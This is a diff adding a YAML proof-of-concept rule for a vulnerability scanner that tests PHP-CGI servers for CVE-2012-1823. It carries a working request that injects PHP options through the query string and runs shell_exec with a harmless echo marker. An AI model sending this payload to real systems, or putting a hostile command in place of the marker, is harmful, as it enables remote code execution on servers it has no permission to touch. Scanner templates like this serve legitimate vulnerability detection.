@@ -1,0 +1,15 @@
+name: poc-yaml-php-cgi-rce
+rules:
+  - method: POST
+    path: /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+    body: <?php echo shell_exec("echo test CVE-2012-1823 by xray"); ?>
+    follow_redirects: false
+    expression: >-
+      status==200 &&
+      body.bcontains(b'test CVE-2012-1823 by xray')
+detail:
+    author: leezp
+    Affected PHP Version: "php < 5.3.12 or php < 5.4.2"
+    Environment: https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823
+
+
